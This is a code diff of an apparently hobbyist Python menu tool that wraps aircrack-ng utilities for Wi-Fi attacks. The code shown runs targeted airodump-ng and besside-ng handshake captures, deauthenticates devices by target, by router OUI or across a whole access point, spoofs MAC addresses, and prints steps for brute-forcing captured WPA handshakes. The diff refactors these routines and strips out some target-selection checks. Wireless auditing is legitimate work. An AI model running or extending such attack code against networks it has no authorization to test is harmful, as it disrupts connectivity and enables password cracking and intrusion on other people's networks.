-        print(f'Switching channel on  {green(interface)} to {green(CHANNEL)}')
-        switch_channel = subprocess.Popen(f'iwconfig {interface} channel {CHANNEL}', shell=True)
-        switch_channel.wait()
-
-        print(f'Running airodump {green(target_ap)}')
-
+        print(f'Switching channel on  {green(selected_interface)} to {green(target_channel)}')
+        switch_interface_channel()
+        print(f'Running airodump {green(target_ap)} for 30 seconds ')
         target_directory = f'/tmp/{target_ap}-Captures'
         os.makedirs(target_directory, exist_ok=True)
-
         airodump_capture_location = f'/tmp/{target_ap}-Captures/{target_ap}'
-
-        airodump = subprocess.Popen(
-            f'airodump-ng --bssid {BSSID} -c {CHANNEL} -w {airodump_capture_location} {interface}',
-            shell=True, preexec_fn=os.setsid, )
-
+        airodump = popen_command_new_terminal(f'airodump-ng --bssid {target_bssid} -c {target_channel} -w {airodump_capture_location} {selected_interface}')
         time.sleep(30)
-
         clear()
         try:
             os.killpg(airodump.pid, signal.SIGTERM)
@@ -1013,11 +909,10 @@ def capture_packets(interface, target_ap):
             print('airodump killed unexpectedly', ProcessLookupError)
 
         print(f"Packet Capture is saved in '{green('/tmp/{target_ap}-Captures/')}'")
-
     else:
-        print('==================================================================================================\n')
+        clear()
         print(f'This message is from {green("capture_handshake")}')
-        print(f'There is a problem with {red("get_devices_in_AP_output")}')
+        print(f'There is a problem with {red("output from airodump-ng")}')
         input(f'input anything to return to previous function \n')
         return
 
@@ -1094,7 +989,7 @@ def besside(interface):
         for terminal in terminals:
             target_directory = f'/tmp/besside-all'
             os.makedirs(target_directory, exist_ok=True)
-            besside_process = subprocess.Popen(f'{terminal} -e besside-ng {interface}',
+            besside_process = subprocess.Popen(f'{terminal} -e besside-ng {selected_interface}',
                                                shell=True,
                                                preexec_fn=os.setsid,
                                                cwd=target_directory)
@@ -1117,42 +1012,32 @@ def besside(interface):
             return
 
 
-def besside_target_ap(interface, target_ap):
-    bssid, channel = get_bssid_and_station_from_ap(interface, target_ap)
-    print(bssid)
-    if bssid:
-        clear()
-        for terminal in terminals:
-            target_directory = f'/tmp/{target_ap}-besside'
-            os.makedirs(target_directory, exist_ok=True)
+def besside_target_ap():
+    clear()
+    for terminal in terminals:
+        target_directory = f'/tmp/{target_ap}-besside'
+        os.makedirs(target_directory, exist_ok=True)
 
-            besside_process = subprocess.Popen(f'{terminal} -e besside-ng -b {bssid} {interface}',
-                                               shell=True,
-                                               preexec_fn=os.setsid,
-                                               cwd=target_directory)
-            besside_process.wait()
-            print(f'Process is Complete\n',
-                  f'To check if handshake capture was successful look at the {green("besside.log")} '
-                  f'in {green(target_directory)}\n')
-            print(f'If handshake was captured then either use {green("wep.cap")} '
-                  f'or {green("wpa.cap")} with aircrack to bruteforce password')
-            print(f''
-                  f'If you dont know which one to use then open them using {green("wireshark")} '
-                  f'only one of the files should have packets inside. Use the file with the packets \n')
-            input('input anything to return to network attacks menu : ')
-            return
+        besside_process = subprocess.Popen(f'{terminal} -e besside-ng -b {target_bssid} {selected_interface}',
+                                           shell=True,
+                                           preexec_fn=os.setsid,
+                                           cwd=target_directory)
+        besside_process.wait()
+        print(f'Process is Complete\n',
+              f'To check if handshake capture was successful look at the {green("besside.log")} '
+              f'in {green(target_directory)}\n')
+        print(f'If handshake was captured then either use {green("wep.cap")} '
+              f'or {green("wpa.cap")} with aircrack to bruteforce password')
+        print(f''
+              f'If you dont know which one to use then open them using {green("wireshark")} '
+              f'only one of the files should have packets inside. Use the file with the packets \n')
+        input('input anything to return to network attacks menu : ')
         return
-    else:
-        print("BSSID not found")
+
+
 
 
 def airdecap_wpa(target_ap):
-    """
-    https://www.aircrack-ng.org/doku.php?id=airdecap-ng
-
-    :paramtarget_ap:
-    :return:
-    """
     while 1:
         print(f'Here is the list of all cap files that start with {green(target_ap)} in /tmp\n')
         find_files_with_locate = subprocess.run(
@@ -1315,10 +1200,11 @@ if __name__ == "__main__":
         print()
         Interface_Options = [
             f'{blue("--------------------------------------------------------")}',
-            f'{green("1)")} Select Monitor Interface',
-            f"{green('2)')} Put interface in to monitor mode",
-            f"{green('3)')} Put interface in to managed mode",
-            f"{green('4)')} Spoof MAC Address",
+            f'{green("1)")} Select Interface',
+            f'{blue("--------------------------------------------------------")}',
+            f"{green('2)')} Change Interface to monitor mode",
+            f"{green('3)')} Change Interface to managed mode",
+            f"{green('4)')} Change Interface MAC Address",
             f'{blue("--------------------------------------------------------")}',
             f'{yellow("Interface ")}     : {cyan(selected_interface)}',
             f'{yellow("Interface Mode")} : {cyan(interface_mode)}',
@@ -1375,8 +1261,7 @@ if __name__ == "__main__":
         match input("jukebox > ").lower():
             case "test":
                 selected_interface = "wlan0"
-                scan_for_networks()
-                select_target_device()
+                oui_formatter()
                 input()
             case "999":
                 Section = Previous_Section
@@ -1400,28 +1285,20 @@ if __name__ == "__main__":
                     scan_for_networks()
 
             case '2':
-                if Section[0] == "Interface" and selected_interface == "":
-                    print("Cannot continue without selecting a interface")
-                    print(selected_interface)
-                elif Section[0] == "Interface":
+                if Section[0] == "Interface":
                     switch_interface_to_monitor_mode()
                 elif Section[0] == "Wireless":
-                    target_router_oui = scan_for_networks_by_oui_select_router(selected_interface)
+                    target_router_oui = scan_for_networks_by_oui_select_router()
 
             case '3':
-                if selected_interface == "":
-                    print("Cannot continue without selecting a interface")
-                    print(selected_interface)
-                elif Section[0] == "Interface":
+                if Section[0] == "Interface":
                     switch_interface_to_managed_mode()
                 elif Section[0] == 'Wireless':
                     select_target_device()
 
             case '4':
-                if selected_interface == "":
-                    print("Select an interface first")
                 if Section[0] == "Interface":
-                    spoof_mac_of_interface_with_random_byte(selected_interface)
+                    spoof_mac_of_interface_with_random_byte()
 
             case 'd1':
                 if Section[0] == "Wireless" and target_ap == "":
@@ -1432,24 +1309,20 @@ if __name__ == "__main__":
                     deauth()
 
             case 'd2':
-                if Section[0] == "Wireless" and target_ap == "":
-                    print('To select a target Device first select a target AP to continue with this attack')
-                    if input('Select a target Y/N').lower() == 'y':
-                        scan_for_networks()
-                elif Section[0] == "Wireless" and target_device == "":
-                    print("Select a Target Device to continue with this attack")
-                    if input('Select a target Y/N').lower() == 'y':
-                        select_target_device()
-                elif Section[0] == "Wireless":
-                    deauth_selected_device(selected_interface, target_device, target_ap)
+                if Section[0] == "Wireless":
+                    deauth_target_device()
 
             case 'd3':
                 if Section[0] == "Wireless" and target_router_oui == "":
                     print("Select a target OUI to continue with this attack")
                     if input('Select a target Y/N').lower() == 'y':
-                        target_router_oui = scan_for_networks_by_oui_select_router(selected_interface)
+                        target_router_oui = scan_for_networks_by_oui_select_router()
                 elif Section[0] == "Wireless":
-                    deauth_by_oui(selected_interface, target_router_oui)
+                    deauth_by_oui()
+
+            case 'd4':
+                if Section[0] == "Wireless":
+                    deauth_devices_in_target_ap()
 
             case 'c1':
                 if Section[0] == "Wireless" and target_ap == "":
@@ -1457,23 +1330,15 @@ if __name__ == "__main__":
                     if input('Select a target Y/N').lower() == 'y':
                         scan_for_networks()
                 elif Section[0] == "Wireless":
-                    capture_packets(selected_interface, target_ap)
+                    capture_packets()
 
             case 'c2':
-                if Section[0] == "Wireless" and target_ap == "":
-                    print('Select a target AP to continue with this attack')
-                    if input('Select a target Y/N').lower() == 'y':
-                        scan_for_networks()
-                elif Section[0] == "Wireless":
+                if Section[0] == "Wireless":
                     capture_handshake()
 
             case 'c3':
-                if Section[0] == "Wireless" and target_ap == "":
-                    print('Select a target AP and capture its handshake to continue with this attack')
-                    if input('Select a target Y/N').lower() == 'y':
-                        scan_for_networks()
-                elif Section[0] == "Wireless":
-                    bruteforce_handshake_capture(selected_interface, target_ap)
+                if Section[0] == "Wireless":
+                    bruteforce_handshake_capture()
 
             case 'c4':
                 if Section[0] == "Wireless" and target_ap == "":
@@ -1493,7 +1358,7 @@ if __name__ == "__main__":
                     if input('Select a target Y/N').lower() == 'y':
                         scan_for_networks()
                 elif Section[0] == "Wireless":
-                    besside_target_ap(selected_interface, target_ap)
+                    besside_target_ap()
 
             case 'g1':
                 if Section[0] == "Wireless" and target_ap == "":
